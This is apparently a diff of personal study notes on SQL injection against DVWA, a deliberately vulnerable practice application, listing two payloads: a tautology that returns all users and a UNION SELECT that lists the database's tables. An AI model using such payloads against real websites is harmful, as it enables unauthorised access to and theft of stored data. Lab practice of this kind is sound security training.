@@ -1,5 +1,6 @@
 # SQLi
 When DVWA security is set to LOW:
+
 1.)Reveals all user is:1' OR '1'='1'#
 
 2.)Reveals name of all tables in the database:'UNION SELECT table_name, NULL FROM information_schema.tables#
